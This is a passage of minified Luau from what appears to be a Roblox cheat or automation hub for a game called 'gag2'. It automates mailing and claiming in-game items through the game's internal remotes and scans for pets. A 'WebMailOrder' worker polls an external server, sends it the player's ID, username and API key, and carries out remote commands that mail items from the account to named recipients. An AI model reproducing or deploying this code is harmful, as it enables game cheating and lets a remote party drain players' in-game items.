				E[i] = c
				table.insert(g, c)
			end
			c.count += j
		end
		Z.Webhooks.QueueMail("automatic", {
			ruleId = string.format("Combined (%d rules)", # i);
			recipient = y.username;
			items = g
		})
		Z.Mail.SetStatus(string.format("Auto | Sent %d items from %d rules to @%s", q, # i, y.username), "#7CFC00")
		return q
	end,
	ProcessAutoRules = function()
		if not h.mail_auto_send_enabled or g.MailManualRunning or Z.Mail.Busy then
			return 0
		end
		local G, V = Z.Mail.ProcessSimpleMailPlan()
		if V then
			return G
		end
		local y = type(h.mail_auto_rules) == "table" and h.mail_auto_rules or {}
		local j = {}
		local i = 0
		for G, V in pairs(y) do
			if type(G) == "string" and (type(V) == "table" and V.enabled == true) then
				i += 1
				table.insert(j, G)
			end
		end
		if i == 0 then
			Z.Mail.SetStatus("Auto send waiting: add a rule", "#CFCFCF")
			return 0
		end
		table.sort(j)
		if h.mail_auto_batch_together then
			local G = Z.Mail.ProcessCombinedAutoRules(y, j)
			if G <= 0 then
				Z.Mail.SetStatus("Auto send waiting for matching items", "#CFCFCF")
			end
			return G
		end
		for G, V in ipairs(j) do
			local j = y[V]
			local i = tonumber(Z.Mail.RuleCooldowns[V]) or 0
			if os.clock() < i then
				continue
			end
			local c = Z.Mail.GetAvailableCount(j.category, j.itemName, j.petTypes, j.petSizes, nil, j.fruitMinKg, j.fruitMaxKg, j.fruitMutations, j.fruitVariants, j.fruitMutationBlacklist, j.fruitVariantBlacklist)
			local J = math.max(math.floor(tonumber(j.triggerAmount) or 1), 1)
			local T = math.max(math.floor(tonumber(j.sendAmount) or 1), 1)
			if c < J then
				continue
			end
			local d = {
				userId = tonumber(j.targetUserId);
				username = tostring(j.targetUsername or "");
				displayName = tostring(j.targetDisplayName or j.targetUsername or "")
			}
			if not d.userId or d.userId <= 0 then
				j.enabled = false
				a.Save.SaveDataSync()
				continue
			end
			local u = math.min(T, c)
			local q = 0
			local g = {}
			while h.mail_auto_send_enabled and (j.enabled == true and q < u) do
				local G = Z.Mail.GetAvailableCount(j.category, j.itemName, j.petTypes, j.petSizes, g, j.fruitMinKg, j.fruitMaxKg, j.fruitMutations, j.fruitVariants, j.fruitMutationBlacklist, j.fruitVariantBlacklist)
				local y, i = Z.Mail.BuildBatch(j.category, j.itemName, u - q, j.petTypes, j.petSizes, g, j.fruitMinKg, j.fruitMaxKg, j.fruitMutations, j.fruitVariants, j.fruitMutationBlacklist, j.fruitVariantBlacklist)
				if i <= 0 then
					break
				end
				local c = Z.Mail.GetItemDisplayName(j.category, j.itemName)
				local J = q + i
				local T = string.format("Auto %s | %s | %d/%d", V, c, J, u)
				Z.Mail.SetStatus(string.format("Auto | Sending %s %d/%d to @%s", c, J, u, d.username), "#66CCFF")
				local E, a = Z.Mail.SendBatch(d, y, T, nil, true)
				if not E then
					Z.Mail.RuleCooldowns[V] = os.clock() + Z.Mail.RetryDelay
					Z.Mail.SetStatus("Auto send failed: " .. tostring(a), "#FF5555")
					return q
				end
				q = J
				for G, V in ipairs(y) do
					if V.Category == "Pets" or V.Category == "HarvestedFruits" then
						g[V.ItemKey] = true
					end
				end
				Z.Mail.WaitForInventoryChange(j.category, j.itemName, G, j.petTypes, j.petSizes, j.fruitMinKg, j.fruitMaxKg, j.fruitMutations, j.fruitVariants, j.fruitMutationBlacklist, j.fruitVariantBlacklist)
			end
			Z.Mail.RuleCooldowns[V] = os.clock() + 5
			if q > 0 then
				Z.Webhooks.QueueMail("automatic", {
					ruleId = V,
					recipient = d.username,
					items = {
						{
							category = j.category;
							name = Z.Mail.GetItemDisplayName(j.category, j.itemName) .. Z.Mail.GetFruitFilterText(j);
							count = q
						}
					}
				})
				Z.Mail.SetStatus(string.format("Auto | Sent %d %s to @%s", q, Z.Mail.GetItemDisplayName(j.category, j.itemName) .. Z.Mail.GetFruitFilterText(j), d.username), "#7CFC00")
				return q
			end
		end
		Z.Mail.SetStatus("Auto send waiting for matching items", "#CFCFCF")
		return 0
	end;
	GetAutoAcceptMultiplierRulesMail = function()
		local G = {}
		local V = type(h.mail_auto_accept_multiplier_rules) == "table" and h.mail_auto_accept_multiplier_rules or {}
		for V, y in pairs(V) do
			V = tostring(V or "")
			if V ~= "" and (type(y) == "table" and y.enabled ~= false) then
				G[V] = math.clamp(tonumber(y.multiplier) or 1, 1, 5)
			end
		end
		return G
	end;
	GetAutoAcceptMultiplierSummaryMail = function()
		local G = {}
		for V, y in pairs(Z.Mail.GetAutoAcceptMultiplierRulesMail()) do
			table.insert(G, string.format("%s %s+", V, Z.SellMultiplierOverrides.FormatMultiplierSellMultiplierOverrides(y)))
		end
		table.sort(G)
		if # G == 0 then
			return "<font color=\'#888888\'>No multiplier rules. All item mail is accepted.</font>"
		end
		return "<font color=\'#66CCFF\'>Accept rules:</font> " .. table.concat(G, " | ")
	end,
	RefreshAutoAcceptMultiplierUiMail = function()
		local G = g.MailAutoAcceptMultiplierLabel
		if G and type(G.SetText) == "function" then
			G:SetText(Z.Mail.GetAutoAcceptMultiplierSummaryMail())
		end
		return true
	end,
	SaveAutoAcceptMultiplierRuleMail = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return false, "Select a fruit first"
		end
		if type(h.mail_auto_accept_multiplier_rules) ~= "table" then
			h.mail_auto_accept_multiplier_rules = {}
		end
		h.mail_auto_accept_multiplier_rules[G] = {
			enabled = true,
			multiplier = math.clamp(tonumber(V) or 1, 1, 5)
		}
		a.Save.SaveDataSync()
		Z.Mail.RefreshAutoAcceptMultiplierUiMail()
		return true
	end;
	ClearAutoAcceptMultiplierRulesMail = function()
		h.mail_auto_accept_multiplier_rules = {}
		a.Save.SaveDataSync()
		Z.Mail.RefreshAutoAcceptMultiplierUiMail()
		return true
	end,
	PassesAutoAcceptMultiplierRulesMail = function(G)
		local V = Z.Mail.GetAutoAcceptMultiplierRulesMail()
		if next(V) == nil then
			return true
		end
		if type(G) ~= "table" then
			return false
		end
		if Z.BuySelectFruit and type(Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit) == "function" then
			Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
		end
		local y = type(G.Items) == "table" and G.Items or {
			G
		}
		for G, y in pairs(y) do
			if type(y) ~= "table" then
				continue
			end
			local j = tostring(y.category or y.Category or "")
			if j ~= "HarvestedFruits" and j ~= "Fruits" then
				continue
			end
			local i = tostring(y.itemName or y.ItemName or y.name or y.ItemKey or "")
			local c = V[i]
			if c then
				local G = Z.SellMultiplierOverrides.GetMultiplierForFruitSellMultiplierOverrides(i)
				if G and G >= c then
					return true
				end
			end
		end
		return false
	end;
	ClaimInbox = function(G)
		if not G and not h.mail_auto_accept then
			return 0
		end
		if g.MailManualRunning or Z.Mail.Busy then
			return 0
		end
		local V = y.Networking and y.Networking.Mailbox
		local j = V and V.OpenInbox
		local i = V and V.Claim
		if not j or type(j.Fire) ~= "function" or not i or type(i.Fire) ~= "function" then
			return 0
		end
		Z.Mail.Busy = true
		local c, J = pcall(function()
			return j:Fire()
		end)
		if not c or type(J) ~= "table" then
			Z.Mail.Busy = false
			return 0
		end
		local T = {}
		local d = 0
		for V, y in pairs(J) do
			if type(V) == "string" and type(y) == "table" then
				d += 1
				if G or Z.Mail.PassesAutoAcceptMultiplierRulesMail(y) then
					table.insert(T, V)
				end
			end
		end
		table.sort(T)
		local u = 0
		local q = {}
		for V, y in ipairs(T) do
			if not G and not h.mail_auto_accept then
				break
			end
			Z.Mail.SetStatus(string.format("Claiming incoming mail %d/%d", V, # T), "#66CCFF")
			local j, c, d = pcall(function()
				return i:Fire(y)
			end)
			if j and c == true then
				u += 1
				local G = J[y]
				if type(G) == "table" then
					local V = G.Items
					if type(V) ~= "table" or # V == 0 then
						V = {
							G
						}
					end
					table.insert(q, {
						from = tostring(G.FromName or G.From or "Unknown");
						items = Z.Webhooks.CopyMailItems(V)
					})
				end
				task.wait(Z.Mail.ClaimDelay)
			elseif j and (type(d) == "string" and d ~= "") then
				Z.Mail.SetStatus("Claim failed: " .. d, "#FF5555")
				task.wait(1)
			else
				task.wait(1)
			end
		end
		Z.Mail.Busy = false
		if u > 0 then
			Z.Webhooks.QueueMail("claim", {
				count = u;
				mode = G and "Manual Claim" or "Automatic Claim";
				mails = q
			})
			Z.Mail.SetStatus(string.format("Claimed %d incoming mail", u), "#7CFC00")
		elseif d == 0 then
			Z.Mail.SetStatus("Incoming mailbox is empty", "#CFCFCF")
		elseif # T == 0 then
			Z.Mail.SetStatus("No incoming mail matches multiplier rules", "#CFCFCF")
		else
			Z.Mail.SetStatus("Incoming mail could not be claimed", "#FF5555")
		end
		return u
	end;
	LoadEquippedPets = function()
		local G = y.Networking and (y.Networking.Pets and y.Networking.Pets.GetEquippedPets)
		if not G or type(G.Fire) ~= "function" then
			return false
		end
		local V, j = pcall(function()
			return G:Fire()
		end)
		if not V or type(j) ~= "table" then
			return false
		end
		table.clear(Z.Mail.EquippedPets)
		for G, V in pairs(j) do
			if type(V) == "table" and V.Id ~= nil then
				Z.Mail.EquippedPets[tostring(V.Id)] = true
			end
		end
		return true
	end,
	MailLoopStart = function()
		if Z.Mail.Started then
			return
		end
		Z.Mail.Started = true
		Z.Mail.TrimReceipts()
		if type(h.mail_auto_rules) ~= "table" then
			h.mail_auto_rules = {}
		end
		task.spawn(function()
			Z.Mail.LoadEquippedPets()
			Z.Mail.ResumeManualOrder()
		end)
		local G = y.Networking and y.Networking.Pets
		local V = G and G.PetEquipped
		local j = G and G.PetUnequipped
		if V and V.OnClientEvent then
			V.OnClientEvent:Connect(function(G)
				if G ~= nil then
					Z.Mail.EquippedPets[tostring(G)] = true
				end
			end)
		end
		if j and j.OnClientEvent then
			j.OnClientEvent:Connect(function(G)
				if G ~= nil then
					Z.Mail.EquippedPets[tostring(G)] = nil
				end
			end)
		end
		local i = y.Networking and (y.Networking.Mailbox and y.Networking.Mailbox.Updated)
		if i and i.OnClientEvent then
			i.OnClientEvent:Connect(function()
				if h.mail_auto_accept then
					task.defer(function()
						Z.Mail.ClaimInbox(false)
					end)
				end
			end)
		end
		task.spawn(function()
			while true do
				task.wait(3)
				if not g.GetCheckIfPro() then
					break
				end
				local G, V = pcall(Z.Mail.ProcessAutoRules)
				if not G then
					warn("[Mail] Auto rule error:", V)
					Z.Mail.SetStatus("Auto send error", "#FF4444")
				end
			end
		end)
		task.spawn(function()
			while true do
				task.wait(12)
				if h.mail_auto_accept then
					local G, V = pcall(function()
						Z.Mail.ClaimInbox(false)
					end)
					if not G then
						warn("[Mail] Auto claim error:", V)
					end
				end
			end
		end)
	end
}
Z.Mail.TrimReceipts()
g.MailWebOrderStatusText = ""
g.MailWebOrderLastState = g.MailWebOrderLastState or {}
if type(h.mail_web_completed_orders) ~= "table" then
	h.mail_web_completed_orders = {}
end
Z.WebMailOrder = {
	UrlWebMailOrder = "https://exotichub.app/api/gag2-mail-order-worker",
	StartedWebMailOrder = false;
	BusyWebMailOrder = false;
	PollBusyWebMailOrder = false,
	MaxCompletedWebMailOrder = 30,
	GetIntervalWebMailOrder = function()
		return 7
	end;
	SetStatusWebMailOrder = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.MailWebOrderStatusText = ""
			return false
		end
		g.MailWebOrderStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\140\144 [Web Order]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	GetCommandWebMailOrder = function(G)
		if type(G) ~= "table" then
			return nil
		end
		local V = G.command
		if type(V) ~= "table" then
			V = G.mail_order
		end
		if type(V) ~= "table" then
			return nil
		end
		if V.type ~= "send_mail_order" then
			return nil
		end
		return V
	end,
	GetOrderIdWebMailOrder = function(G)
		if type(G) ~= "table" then
			return ""
		end
		local V = tostring(G.order_id or "")
		return V:match("^%s*(.-)%s*$") or ""
	end;
	TrimCompletedWebMailOrder = function()
		local G = h.mail_web_completed_orders
		if type(G) ~= "table" then
			h.mail_web_completed_orders = {}
			return false
		end
		local V = {}
		for y, Z in pairs(G) do
			if type(y) == "string" and y ~= "" then
				table.insert(V, {
					id = y,
					at = tonumber(Z) or 0
				})
			else
				G[y] = nil
			end
		end
		table.sort(V, function(G, V)
			return G.at > V.at
		end)
		for y = Z.WebMailOrder.MaxCompletedWebMailOrder + 1, # V, 1 do
			G[V[y].id] = nil
		end
		return true
	end,
	BuildItemsPayloadWebMailOrder = function(G)
		local V = {}
		if type(G) ~= "table" or type(G.items) ~= "table" then
			return V
		end
		for G, y in ipairs(G.items) do
			local j = {
				category = tostring(y.category or ""),
				item_name = tostring(y.itemName or "");
				amount = math.max(math.floor(tonumber(y.amount) or 0), 0);
				sent = math.max(math.floor(tonumber(y.sent) or 0), 0)
			}
			if type(y.mailKey) == "string" and y.mailKey ~= "" then
				j.mail_key = y.mailKey
			end
			if type(y.sendMode) == "string" and y.sendMode ~= "" then
				j.send_mode = y.sendMode
			end
			if type(y.displayName) == "string" and y.displayName ~= "" then
				j.display_name = y.displayName
			end
			if type(y.petSize) == "string" and y.petSize ~= "" then
				j.pet_size = y.petSize
			end
			if type(y.petVariant) == "string" and y.petVariant ~= "" then
				j.pet_variant = y.petVariant
			end
			if type(y.fruitKey) == "string" and y.fruitKey ~= "" then
				j.fruit_key = y.fruitKey
			end
			if type(y.fruitId) == "string" and y.fruitId ~= "" then
				j.fruit_id = y.fruitId
			end
			if type(y.fruitMutation) == "string" and y.fruitMutation ~= "" then
				j.fruit_mutation = y.fruitMutation
			end
			if type(y.fruitVariant) == "string" and y.fruitVariant ~= "" then
				j.fruit_variant = y.fruitVariant
			end
			if tonumber(y.fruitWeight) ~= nil then
				j.fruit_weight = tonumber(y.fruitWeight)
			end
			if type(y.itemKeys) == "table" and # y.itemKeys > 0 then
				j.item_keys = Z.Mail.CopyStringArrayMail(y.itemKeys)
			end
			if type(y.itemIds) == "table" and # y.itemIds > 0 then
				j.item_ids = Z.Mail.CopyStringArrayMail(y.itemIds)
			end
			table.insert(V, j)
		end
		return V
	end;
	SetLastStateWebMailOrder = function(G, V, y, Z, j)
		g.MailWebOrderLastState = {
			order_id = tostring(G or ""),
			assignment_id = tostring(V or ""),
			status = tostring(y or "");
			message = tostring(Z or "");
			updated_at = os.time(),
			items = type(j) == "table" and j or {}
		}
	end,
	GetCurrentOrderWebMailOrder = function()
		local G = g.MailActiveOrder
		if type(G) == "table" and G.source == "web" then
			return G
		end
		local V = h.mail_manual_order
		if type(V) == "table" and V.source == "web" then
			return V
		end
		return nil
	end,
	GetPayloadWebMailOrder = function()
		local G = Z.WebMailOrder.GetCurrentOrderWebMailOrder()
		if type(G) == "table" then
			return {
				order_id = tostring(G.webOrderId or ""),
				assignment_id = tostring(G.webAssignmentId or "");
				status = tostring(G.state or "running"),
				target_username = G.recipient and tostring(G.recipient.username or "") or "",
				items = Z.WebMailOrder.BuildItemsPayloadWebMailOrder(G);
				updated_at = os.time()
			}
		end
		if type(g.MailWebOrderLastState) == "table" and tostring(g.MailWebOrderLastState.order_id or "") ~= "" then
			return g.MailWebOrderLastState
		end
		return nil
	end;
	BuildRequestWebMailOrder = function(G, V)
		V = type(V) == "table" and V or {}
		local j = {
			game = "gag2";
			action = tostring(G or "poll"),
			webapi = tostring(h.web_api_key or ""),
			profile_id = tostring(g.player_userid or "");
			username = tostring(y.LocalPlayer and y.LocalPlayer.Name or ""),
			sc_v = tostring(y.CurentV or ""),
			worker_state = Z.WebMailOrder.GetPayloadWebMailOrder()
		}
		for G, V in pairs(V) do
			j[G] = V
		end
		return j
	end,
	ReportWebMailOrder = function(G, V, y, j)
		local i = Z.WebMailOrder.GetOrderIdWebMailOrder(G)
		local c = ""
		local J = Z.WebMailOrder.UrlWebMailOrder
		if type(G) == "table" then
			c = tostring(G.assignment_id or "")
			if type(G.report_url) == "string" and G.report_url ~= "" then
				J = G.report_url
			end
		end
		Z.WebMailOrder.SetLastStateWebMailOrder(i, c, V, y, j)
		if tostring(h.web_api_key or "") == "" then
			return false
		end
		task.spawn(function()
			r.Http.PostJson(J, Z.WebMailOrder.BuildRequestWebMailOrder("report", {
				order_id = i;
				assignment_id = c;
				event = tostring(V or "");
				message = tostring(y or "");
				items = type(j) == "table" and j or {}
			}))
		end)
		return true
	end;
	BuildOrderItemsWebMailOrder = function(G)
		local V = {}
		if type(G) ~= "table" then
			return nil, "No items were sent by the web order"
		end
		for G, y in ipairs(G) do
			if type(y) ~= "table" then
				continue
			end
			local j = tostring(y.category or "")
			local i = tostring(y.item_name or "")
			local c = math.max(math.floor(tonumber(y.amount) or 0), 0)
			if j == "" then
				j = tostring(y.type or "")
			end
			if i == "" then
				i = tostring(y.name or "")
			end
			j, i = Z.Mail.DecodeItemSelection(j, i)
			if not Z.Mail.IsGiftableCategory(j) or type(i) ~= "string" or i == "" or c <= 0 then
				return nil, "Invalid web order item"
			end
			local J = Z.Mail.CopyStringArrayMail(y.item_keys or y.itemKeys)
			local T = Z.Mail.CopyStringArrayMail(y.item_ids or y.itemIds)
			local d = {
				category = j,
				itemName = i;
				amount = c,
				sent = 0;
				mailKey = tostring(y.mail_key or y.mailKey or ""),
				sendMode = tostring(y.send_mode or y.sendMode or ""),
				displayName = tostring(y.display_name or y.displayName or "")
			}
			if # J > 0 then
				d.itemKeys = J
			end
			if # T > 0 then
				d.itemIds = T
			end
			if j == "Pets" then
				d.petSize = tostring(y.pet_size or y.petSize or "")
				d.petVariant = tostring(y.pet_variant or y.petVariant or "")
			elseif j == "HarvestedFruits" then
				d.fruitKey = tostring(y.fruit_key or y.fruitKey or "")
				d.fruitId = tostring(y.fruit_id or y.fruitId or "")
				d.fruitWeight = tonumber(y.fruit_weight or y.fruitWeight)
				d.fruitMutation = tostring(y.fruit_mutation or y.fruitMutation or "")
				d.fruitVariant = tostring(y.fruit_variant or y.fruitVariant or "")
			end
			table.insert(V, d)
		end
		if # V == 0 then
			return nil, "No valid web order items"
		end
		return V, nil
	end,
	ProcessCommandWebMailOrder = function(G)
		if Z.WebMailOrder.BusyWebMailOrder then
			return false
		end
		Z.WebMailOrder.BusyWebMailOrder = true
		local V, y = pcall(function()
			local V = Z.WebMailOrder.GetOrderIdWebMailOrder(G)
			if V == "" then
				return false
			end
			if type(h.mail_web_completed_orders) ~= "table" then
				h.mail_web_completed_orders = {}
			end
			if h.mail_web_completed_orders[V] ~= nil then
				Z.WebMailOrder.SetStatusWebMailOrder("Order already completed: " .. V, "#CFCFCF")
				Z.WebMailOrder.ReportWebMailOrder(G, "already_completed", "Order already completed", {})
				return false
			end
			local y = h.mail_manual_order
			if type(y) == "table" and (y.source == "web" and tostring(y.webOrderId or "") == V) then
				if not g.MailManualRunning then
					Z.WebMailOrder.SetStatusWebMailOrder("Resuming web order " .. V, "#66CCFF")
					Z.Mail.RunManualOrder(y)
				end
				return true
			end
			if g.MailManualRunning or Z.Mail.IsSavedManualOrderValid(y) then
				Z.WebMailOrder.SetStatusWebMailOrder("Waiting: mail system is busy", "#FFCC66")
				Z.WebMailOrder.ReportWebMailOrder(G, "busy", "Mail system is busy", {})
				return false
			end
			local j = tostring(G.target_username or "")
			local i, c = Z.Mail.LookupRecipient(j)
			if not i then
				Z.WebMailOrder.SetStatusWebMailOrder(tostring(c or "Recipient lookup failed"), "#FF5555")
				Z.WebMailOrder.ReportWebMailOrder(G, "failed", tostring(c or "Recipient lookup failed"), {})
				return false
			end
			local J, T = Z.WebMailOrder.BuildOrderItemsWebMailOrder(G.items)
			if not J then
				Z.WebMailOrder.SetStatusWebMailOrder(tostring(T or "Invalid web order"), "#FF5555")
				Z.WebMailOrder.ReportWebMailOrder(G, "failed", tostring(T or "Invalid web order"), {})
				return false
			end
			local d = {
				version = 1;
				id = "WEB-" .. V,
				recipient = i;
				items = J;
				pending = {},
				startedAt = os.time();
				state = "running";
				batchTogether = G.batch_together == true;
				source = "web",
				webOrderId = V,
				webAssignmentId = tostring(G.assignment_id or "");
				reportUrl = tostring(G.report_url or "")
			}
			Z.Mail.SaveManualOrder(d)
			Z.WebMailOrder.SetStatusWebMailOrder("Started web order " .. V, "#66CCFF")
			Z.WebMailOrder.ReportWebMailOrder(G, "claimed", "Web order claimed", Z.WebMailOrder.BuildItemsPayloadWebMailOrder(d))
			return Z.Mail.RunManualOrder(d)
		end)
		Z.WebMailOrder.BusyWebMailOrder = false
		if not V then
			warn("[WebMailOrder]", y)
			Z.WebMailOrder.SetStatusWebMailOrder("Web order worker error", "#FF5555")
			return false
		end
		return y == true
	end,
	HandleResponseWebMailOrder = function(G)
		local V = Z.WebMailOrder.GetCommandWebMailOrder(G)
		if type(V) ~= "table" then
			return false
		end
		task.spawn(function()
			Z.WebMailOrder.ProcessCommandWebMailOrder(V)
		end)
		return true
	end;
	CancelCurrentOrderWebMailOrder = function(G, V)
		if type(G) ~= "table" or G.source ~= "web" then
			return false
		end
		local y = tostring(G.webOrderId or "")
		if y == "" then
			return false
		end
		local j = tostring(G.webAssignmentId or "")
		local i = false
		local c = g.MailActiveOrder
		if type(c) == "table" and (c.source == "web" and tostring(c.webOrderId or "") == y) then
			c.cancelled = true
			g.MailManualRunning = false
			g.MailActiveOrder = nil
			i = true
		end
		local J = h.mail_manual_order
		if type(J) == "table" and (J.source == "web" and tostring(J.webOrderId or "") == y) then
			J.cancelled = true
			Z.Mail.ClearSavedManualOrder()
			i = true
		end
		if not i then
			return false
		end
		V = tostring(V or "Order cancelled online")
		Z.WebMailOrder.SetLastStateWebMailOrder(y, j, "cancelled", V, Z.WebMailOrder.BuildItemsPayloadWebMailOrder(G))
		Z.WebMailOrder.SetStatusWebMailOrder("Cancelled web order " .. y, "#FF7777")
		Z.Mail.SetStatus(V, "#FF7777")
		Z.Mail.SetManualUiStatus(V, "#FF7777", "\226\143\185\239\184\143")
		Z.Mail.RefreshManualUi()
		Z.Mail.RefreshDraftUi()
		return true
	end;
	HandleCurrentOrderStatusWebMailOrder = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" or type(V.orders) ~= "table" then
			return false
		end
		local y = tostring(G.webOrderId or "")
		if y == "" then
			return false
		end
		local j = nil
		for G, V in ipairs(V.orders) do
			if type(V) == "table" and tostring(V.order_code or "") == y then
				j = V
				break
			end
		end
		if type(j) ~= "table" then
			return false
		end
		local i = tostring(j.status or "")
		if i == "cancelled" then
			return Z.WebMailOrder.CancelCurrentOrderWebMailOrder(G, "Web order was cancelled")
		end
		if ((i == "queued" or i == "running")) and not g.MailManualRunning then
			Z.WebMailOrder.SetStatusWebMailOrder("Resuming web order " .. y, "#66CCFF")
			return Z.Mail.RunManualOrder(G)
		end
		return true
	end,
	PollWebMailOrder = function()
		if Z.WebMailOrder.PollBusyWebMailOrder or Z.WebMailOrder.BusyWebMailOrder then
			return false
		end
		if tostring(h.web_api_key or "") == "" then
			return false
		end
		local G = Z.WebMailOrder.GetCurrentOrderWebMailOrder()
		local V = "poll"
		local j = {}
		if type(G) == "table" then
			local y = tostring(G.webOrderId or "")
			if y == "" then
				return false
			end
			V = "status"
			j.order_id = y
		end
		Z.WebMailOrder.PollBusyWebMailOrder = true
		local i, c, J = r.Http.PostJson(Z.WebMailOrder.UrlWebMailOrder, Z.WebMailOrder.BuildRequestWebMailOrder(V, j))
		Z.WebMailOrder.PollBusyWebMailOrder = false
		if not i or type(J) ~= "string" or J == "" then
			return false
		end
		local T, d = pcall(y.HttpService.JSONDecode, y.HttpService, J)
		if not T or type(d) ~= "table" then
			return false
		end
		if type(G) == "table" then
			return Z.WebMailOrder.HandleCurrentOrderStatusWebMailOrder(G, d)
		end
		return Z.WebMailOrder.HandleResponseWebMailOrder(d)
	end;
	StartWebMailOrder = function()
		if Z.WebMailOrder.StartedWebMailOrder then
			return false
		end
		Z.WebMailOrder.StartedWebMailOrder = true
		task.spawn(function()
			task.wait(5)
			while true do
				Z.WebMailOrder.PollWebMailOrder()
				task.wait(Z.WebMailOrder.GetIntervalWebMailOrder())
			end
		end)
		return true
	end,
	CompleteWebMailOrder = function(G)
		if type(G) ~= "table" or G.source ~= "web" then
			return false
		end
		local V = tostring(G.webOrderId or "")
		if V == "" then
			return false
		end
		if type(h.mail_web_completed_orders) ~= "table" then
			h.mail_web_completed_orders = {}
		end
		h.mail_web_completed_orders[V] = os.time()
		Z.WebMailOrder.TrimCompletedWebMailOrder()
		Z.WebMailOrder.SetStatusWebMailOrder("Completed web order " .. V, "#7CFC00")
		Z.WebMailOrder.ReportWebMailOrder({
			order_id = V;
			assignment_id = tostring(G.webAssignmentId or "");
			report_url = tostring(G.reportUrl or "")
		}, "completed", "Web order completed", Z.WebMailOrder.BuildItemsPayloadWebMailOrder(G))
		a.Save.SaveDataSync()
		return true
	end
}
g.PetFinder_WebhookData = g.PetFinder_WebhookData or {}
g.Mail_WebhookData = g.Mail_WebhookData or {}
g.EventSeed_WebhookData = g.EventSeed_WebhookData or {}
g.ShopPurchase_WebhookData = g.ShopPurchase_WebhookData or {}
g.PetFinderPremiumStatusText = ""
g.PetFinderPremiumUi = g.PetFinderPremiumUi or {}
Z.PetFinderPremium = {
	Started = false;
	Busy = false;
	Folder = nil;
	Pets = {};
	FolderConnections = {},
	Pending = nil;
	Handled = {};
	RetryAt = {};
	Attempts = {};
	ExpectedCounts = {},
	MaxAttempts = 2,
	SizeRanks = {
		Normal = 1;
		Big = 2;
		Huge = 3
	};
	VariantRanks = {
		Normal = 1;
		Rainbow = 2
	},
	NextScanAt = 0,
	NextHopAt = 0;
	ScanDelay = 10,
	ConfirmTimeout = 3,
	SetStatus = function(G, V)
		g.PetFinderPremiumStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\144\190 [Pet Finder Premium]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or "Waiting"))
	end,
	ClearStatus = function()
		g.PetFinderPremiumStatusText = ""
	end;
	GetServerTime = function()
		local G, V = pcall(function()
			return y.Workspace:GetServerTimeNow()
		end)
		return G and tonumber(V) or os.time()
	end,
	CopyMap = function(G)
		local V = {}
		if type(G) == "table" then
			for G, y in pairs(G) do
				if type(G) == "string" and (G ~= "" and y == true) then
					V[G] = true
				end
			end
		end
		return V
	end;
	GetDisplayName = function(G)
		local V = type(y.PetData) == "table" and y.PetData[G] or nil
		local Z = type(V) == "table" and V.DisplayName or nil
		return type(Z) == "string" and (Z ~= "" and Z) or tostring(G or "Unknown")
	end,
	GetPetLabel = function(G, V, y)
		local Z = {}
		if type(G) == "string" and (G ~= "" and G ~= "Normal") then
			table.insert(Z, G)
		end
		if type(V) == "string" and (V ~= "" and V ~= "Normal") then
			table.insert(Z, V)
		end
		table.insert(Z, tostring(y or "Unknown"))
		return table.concat(Z, " ")
	end,
	GetRarity = function(G, V)
		if type(V) == "string" and V ~= "" then
			return V
		end
		local Z = type(y.PetData) == "table" and y.PetData[G] or nil
		return type(Z) == "table" and tostring(Z.Rarity or "Unknown") or "Unknown"
	end,
	GetSize = function(G)
		if type(G) ~= "string" or G == "" then
			return "Normal"
		end
		local V = type(y.PetSizes) == "table" and (type(y.PetSizes.Normalize) == "function" and y.PetSizes.Normalize(G)) or nil
		return type(V) == "string" and (V ~= "" and V) or G
	end,
	GetVariant = function(G)
		return type(G) == "string" and (G ~= "" and G) or "Normal"
	end;
	GetInventoryPets = function()
		local G = Z.DataReplica.GetData("Inventory")
		local V = type(G) == "table" and G.Pets or nil
		return type(V) == "table" and V or {}
	end,
	GetPetDropdown = function()
		local G = {}
		if type(y.PetData) ~= "table" then
			return G
		end
		for V, y in pairs(y.PetData) do
			if type(V) ~= "string" or V == "" or type(y) ~= "table" then
				continue
			end
			local j = tostring(y.DisplayName or V)
			local i = tostring(y.Rarity or "Unknown")
			local c = tonumber(y.BasePrice) or 0
			local J = tostring(y.SpawnChance or 0)
			local T = Z.Data.GetRarityColor(i)
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#7CFC00\">$%s</font> <font color=\"%s\">%s</font> <font color=\"#CFCFCF\">(%%%s)</font>", j, q.formatShecklesNumber(c), T, i, J),
				Value = V,
				Rank = g.RarityRank[i] or 0
			})
		end
		table.sort(G, function(G, V)
			if G.Rank ~= V.Rank then
				return G.Rank > V.Rank
			end
			return tostring(G.Value) < tostring(V.Value)
		end)
		return G
	end;
	GetOptionValues = function(G)
		local V = {
			Normal = true
		}
		if G == "Size" and (type(y.PetSizes) == "table" and type(y.PetSizes.Scales) == "table") then
			for G in pairs(y.PetSizes.Scales) do
				V[G] = true
			end
		elseif G == "Variant" and (type(y.PetTypes) == "table" and type(y.PetTypes.Rainbow) == "string") then
			V[y.PetTypes.Rainbow] = true
		end
		for y in pairs(Z.PetFinderPremium.Pets) do
			if y and y.Parent then
				local j = G == "Size" and Z.PetFinderPremium.GetSize(y:GetAttribute("PetSize")) or Z.PetFinderPremium.GetVariant(y:GetAttribute("PetType"))
				V[j] = true
			end
		end
		for y, j in pairs(Z.PetFinderPremium.GetInventoryPets()) do
			if type(j) == "table" then
				local y = G == "Size" and Z.PetFinderPremium.GetSize(j.Size) or Z.PetFinderPremium.GetVariant(j.Type)
				V[y] = true
			end
		end
		local j = {}
		local i = G == "Size" and {
			Normal = 1,
			Big = 2;
			Huge = 3
		} or {
			Normal = 1,
			Rainbow = 2
		}
		for G in pairs(V) do
			table.insert(j, G)
		end
		table.sort(j, function(G, V)
			local y = i[G] or 100
			local Z = i[V] or 100
			if y ~= Z then
				return y < Z
			end
			return tostring(G) < tostring(V)
		end)
		local c = {}
		for G, V in ipairs(j) do
			table.insert(c, {
				Text = V,
				Value = V
			})
		end
		return c
	end;
	GetSizeValues = function()
		return Z.PetFinderPremium.GetOptionValues("Size")
	end,
	GetVariantValues = function()
